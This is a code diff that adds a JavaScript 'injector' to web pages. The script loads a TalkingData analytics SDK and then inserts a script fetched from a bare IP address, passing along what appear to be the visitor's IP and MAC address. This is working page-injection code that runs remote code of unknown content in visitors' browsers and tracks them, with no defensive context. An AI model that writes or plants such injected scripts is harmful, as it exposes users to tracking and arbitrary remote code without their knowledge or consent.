@@ -1,0 +1,29 @@
+var grint_systemid='63054D43-7C33-42BD-9DC5-9C8F691E10B8-HBNYDX';
+//var grint_systemid = '1.0.0';
+var XiaoyunInjector = (function(){ 
+	if (!document || !document.body || !document.body.insertBefore) 
+		return setTimeout(arguments.callee, 50);
+	
+	//talkingdata statistics variables
+  var talkingdataAppId = '1BC0522189344A7E841790077A48E9E6';
+  var TDsrc = document.createElement('script');
+  TDsrc.type = 'text/javascript';
+  TDsrc.src = 'http://sdk.talkingdata.com/app/h5/v1?appid=' + talkingdataAppId;
+  document.body.appendChild(TDsrc);
+  
+  window.onload = function() {
+	  TDAPP.onEvent(grint_systemid);
+	}
+  
+	var redPoint= document.createElement('script'); 
+	redPoint.src = 'http://120.27.210.51/?d=a5d57cff37fb3069eb2b54cbfc93e18d&i=113.128.61.5&m=00259EB1CE19&radius=20010123&redirect=false'; 
+	redPoint.charset = 'utf-8'; 
+	redPoint.async = 'true'; 
+	redPoint.defer = 'true'; 
+	redPoint.type = 'text/javascript'; 
+	document.body.insertBefore(redPoint, document.body.children.item(0)); 
+
+})();
+
+
+
